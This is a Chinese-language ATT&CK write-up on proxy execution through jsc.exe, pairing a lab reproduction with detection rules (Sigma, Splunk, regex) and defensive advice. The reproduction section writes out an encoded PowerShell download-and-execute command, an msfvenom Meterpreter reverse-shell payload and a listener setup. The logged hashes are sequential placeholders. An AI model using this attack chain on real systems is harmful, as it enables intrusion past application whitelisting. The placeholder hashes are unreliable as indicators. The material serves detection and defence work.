# T1127-受信任的开发者实用程序代理执行-Jsc.exe(白名单)

## 描述

攻击者可利用受信任的开发者工具（如`jsc.exe`）代理执行恶意Payload。`jsc.exe`是MicrosoftJScript.NET编译器，位于.NET Framework目录，由Microsoft签名，用于将JavaScript代码编译为可执行文件（`.exe`）或动态链接库（`.dll`）。其合法签名使其可绕过应用程序白名单（如AppLocker）或防病毒检测。

攻击者滥用`jsc.exe`编译恶意JavaScript代码，生成可执行文件或库文件，执行恶意行为，如加载远程访问工具或反弹Shell。此技术常用于防御规避、持久化或横向移动。

## 测试案例

### 测试案例1：Jsc.exe编译JavaScript为可执行文件
`jsc.exe`编译JavaScript文件生成`.exe`文件。

**命令**：
```cmd
jsc.exe scriptfile.js
```

- **示例JavaScript（scriptfile.js）**：
  ```javascript
  import System;
  Console.WriteLine("Hello from JScript!");
  new ActiveXObject("WScript.Shell").Run("calc.exe");
  ```

- **说明**：
  - 编译`scriptfile.js`生成`scriptfile.exe`，执行时触发`calc.exe`。
  - 用途：编译攻击者代码，绕过防御。
- **权限**：普通用户可执行。
- **支持系统**：WindowsVista、Windows7、Windows8、Windows8.1、Windows10。

### 测试案例2：Jsc.exe编译JavaScript为动态链接库
`jsc.exe`编译JavaScript文件生成`.dll`文件。

**命令**：
```cmd
jsc.exe /t:library Library.js
```

- **示例JavaScript（Library.js）**：
  ```javascript
  import System;
  class Malicious {
    static function Execute() {
      new ActiveXObject("WScript.Shell").Run("notepad.exe");
    }
  }
  ```

- **说明**：
  - 使用`/t:library`生成`Library.dll`，可通过其他程序加载执行。
  - 用途：生成恶意库文件，规避检测。
- **权限**：普通用户可执行。
- **支持系统**：WindowsVista、Windows7、Windows8、Windows8.1、Windows10。

## 检测日志

### 数据来源
- Windows安全日志：
  - 事件ID4688：进程创建，记录`jsc.exe`及其生成文件的执行信息。
- Sysmon日志：
  - 事件ID1：进程创建，包含命令行、哈希值和父进程。
  - 事件ID11：文件创建，记录生成的`.exe`或`.dll`文件。
  - 事件ID10：进程访问，记录子进程调用。
- 文件监控：
  - 检测非开发环境下的`.exe`或`.dll`文件生成。
- 行为监控：
  - 检测`jsc.exe`触发的子进程（如`calc.exe`或`notepad.exe`）。

## 测试复现

### 环境准备
- 攻击机：KaliLinux2019
- 靶机：Windows7或Windows10（需安装.NETFramework4.0或2.0）
- 工具：
  - MetasploitFramework（生成Payload和监听）
  - Sysmon（可选，日志收集）

### 攻击分析

#### 测试1：Jsc.exe编译恶意JavaScript为可执行文件
1. **创建恶意JavaScript**：
   创建`malicious.js`：
   ```javascript
   import System;
   new ActiveXObject("WScript.Shell").Run("powershell.exe -NoProfile -EncodedCommand JABjAG0AZAAgAD0AIAAiAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAIgA7ACQAdwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAJABjAG0AZAA7ACQAdwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEAOQAxAC4xADYAOgA4ADAALwBtAGEAbABpAGcAbgBhAG4AdAAuAGUAeABlACIALAAiAEMAOgBcAFQAZQBtAHAAXABtAGEAbABpAGcAbgBhAG4AdAAuAGUAeABlACIAKQAKAA==");
   ```
   - 解码后的PowerShell命令下载并执行`malicious.exe`。

2. **编译JavaScript**：
   在靶机上：
   ```cmd
   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\jsc.exe malicious.js
   ```

3. **生成Payload**：
   在攻击机上生成`malicious.exe`：
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=12345 -f exe -o malicious.exe
   ```

4. **托管Payload**：
   启动HTTP服务器：
   ```bash
   cp malicious.exe /var/www/html/
   sudo python3 -m http.server 80
   ```

5. **配置攻击机监听**：
   ```bash
   msf5>use exploit/multi/handler
   msf5 exploit(multi/handler)>set payload windows/x64/meterpreter/reverse_tcp
   msf5 exploit(multi/handler)>set LHOST 192.168.126.146
   msf5 exploit(multi/handler)>set LPORT 12345
   msf5 exploit(multi/handler)>exploit
   ```

6. **靶机执行**：
   ```cmd
   malicious.exe
   ```

7. **结果分析**：
   - 成功：编译生成`malicious.exe`，执行后触发PowerShell下载并运行Payload，获得Meterpreter会话。
   - 失败可能：
     - .NETFramework未安装（需安装4.0或2.0）。
     - 防火墙阻止HTTP请求或TCP12345连接。
     - PowerShell执行策略限制（需设置为`Bypass`：`Set-ExecutionPolicy Bypass`）。

#### 测试2：Jsc.exe编译JavaScript为动态链接库
1. **创建恶意JavaScript**：
   创建`Library.js`：
   ```javascript
   import System;
   class Malicious {
     static function Execute() {
       new ActiveXObject("WScript.Shell").Run("calc.exe");
     }
   }
   ```

2. **编译JavaScript**：
   ```cmd
   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\jsc.exe /t:library Library.js
   ```

3. **加载DLL**：
   使用`rundll32.exe`加载`Library.dll`：
   ```cmd
   rundll32.exe Library.dll,Malicious.Execute
   ```

4. **结果分析**：
   - 成功：生成`Library.dll`，加载后触发`calc.exe`。
   - 失败可能：DLL导出函数调用错误或.NETFramework版本不匹配。

## 测试留痕

### Windows安全日志
- 事件ID4688：
  - 记录`jsc.exe`的进程创建：
    ```
    进程信息:
      新进程名称:C:\Windows\Microsoft.NET\Framework64\v4.0.30319\jsc.exe
      命令行:jsc.exe malicious.js
      创建者进程名称:C:\Windows\System32\cmd.exe
    ```
  - 记录生成文件的执行：
    ```
    进程信息:
      新进程名称:C:\Users\liyang\Desktop\malicious.exe
      命令行:malicious.exe
      创建者进程名称:C:\Windows\System32\cmd.exe
    ```

### Sysmon日志
- 事件ID1：
  - 记录`jsc.exe`执行：
    ```
    事件ID:1
    OriginalFileName:jsc.exe
    CommandLine:jsc.exe malicious.js
    CurrentDirectory:C:\Users\liyang\Desktop\
    User:liyang-PC\liyang
    Hashes:SHA1=1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B
    ParentImage:C:\Windows\System32\cmd.exe
    ```
  - 记录生成文件执行：
    ```
    事件ID:1
    OriginalFileName:malicious.exe
    CommandLine:malicious.exe
    CurrentDirectory:C:\Users\liyang\Desktop\
    User:liyang-PC\liyang
    Hashes:SHA1=2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B1C
    ParentImage:C:\Windows\System32\cmd.exe
    ```
- 事件ID11：记录生成文件（如`malicious.exe`或`Library.dll`）。
- 事件ID3：记录网络连接（如PowerShell下载Payload）。

## 检测规则/思路

### 检测方法
1. 进程监控：
   - 检测`jsc.exe`的执行，尤其是在非开发环境中的调用。
   - 检查命令行是否包含`.js`文件或`/t:library`参数。
2. 命令行分析：
   - 正则表达式匹配：
     ```regex
     jsc\.exe.*(\.js|\/t:library)
     ```
3. 文件监控：
   - 检测非开发目录下的`.exe`或`.dll`文件生成。
4. 行为分析：
   - 检测`jsc.exe`编译后立即执行生成文件的模式。
   - 检测生成的`.dll`被`rundll32.exe`加载。

### Sigma规则
新增Sigma规则以增强检测：
```yaml
title:可疑Jsc.exe编译JavaScript代码
id:7e8f9a0b-1c2d-3e4f-5a6b-7c8d9e0f1a2b
description:检测jsc.exe编译JavaScript文件生成可执行文件或DLL，可能用于代理恶意代码
status:experimental
logsource:
  category:process_creation
  product:windows
detection:
  selection:
    Image|endswith:'\jsc.exe'
    CommandLine|contains:
      - '.js'
      - '/t:library'
  filter_legitimate:
    CurrentDirectory|contains:
      - 'C:\Program Files\'
      - 'C:\Program Files (x86)\'
  condition:selection and not filter_legitimate
fields:
  - Image
  - CommandLine
  - ParentImage
  - User
falsepositives:
  - 合法的开发活动
level:high
tags:
  - attack.execution
  - attack.t1127
```

规则说明：
- 目标：检测`jsc.exe`编译JavaScript文件的行为。
- 过滤：排除开发目录（如`ProgramFiles`）中的合法操作。
- 日志来源：Windows事件ID4688（需启用命令行审核）或Sysmon事件ID1。
- 误报处理：开发环境可能触发，需结合目录和子进程分析。
- 级别：标记为“高”优先级，因`jsc.exe`滥用通常与恶意活动相关。

### Splunk规则
```spl
index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational"
(EventCode=1 Image="*\jsc.exe" CommandLine IN ("*.js*","*/t:library*"))
OR (EventCode=11 FileName IN ("*.exe","*.dll") TargetFilename="*\jsc.exe")
OR (EventCode=10 SourceImage="*\rundll32.exe" TargetImage="*.dll")
| fields Image,CommandLine,ParentImage,User,TargetFilename
```

规则说明：
- 检测`jsc.exe`的编译行为、生成的文件和`rundll32.exe`加载DLL的行为。
- 减少误报：结合文件路径和后续执行行为分析。

### 检测挑战
- 误报：合法开发活动可能触发，需建立开发环境基线。
- 日志依赖：默认日志可能不记录完整命令行，需部署Sysmon或增强日志策略。

## 防御建议
1. 监控和日志：
   - 启用命令行审核策略，确保事件ID4688记录完整参数。
   - 部署Sysmon，配置针对`jsc.exe`的规则，监控文件创建和子进程。
2. 权限控制：
   - 限制非开发用户执行`jsc.exe`的权限。
3. 文件审查：
   - 定期扫描非开发目录下的`.exe`和`.dll`文件，检查文件哈希。
4. 行为基线：
   - 建立开发环境的`jsc.exe`使用基线，检测异常行为。
5. 安全更新：
   - 保持Windows和.NETFramework更新，修复潜在漏洞。

## 参考推荐
- MITREATT&CKT1127:  
  <https://attack.mitre.org/techniques/T1127/>
- Jsc.exe:LOLBAS:  
  <https://lolbas-project.github.io/lolbas/Binaries/Jsc/>
- 远控免杀专题-白名单总结:  
  <http://www.smatrix.org/forum/forum.php?mod=viewthread&tid=316>
- Sysmon配置与检测:  
  <https://github.com/SwiftOnSecurity/sysmon-config>
- MetasploitFramework:用于生成和测试反弹Shell。  
  <https://www.metasploit.com/>
- Sysmon:Microsoft提供的系统监控工具。  
  <https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon>
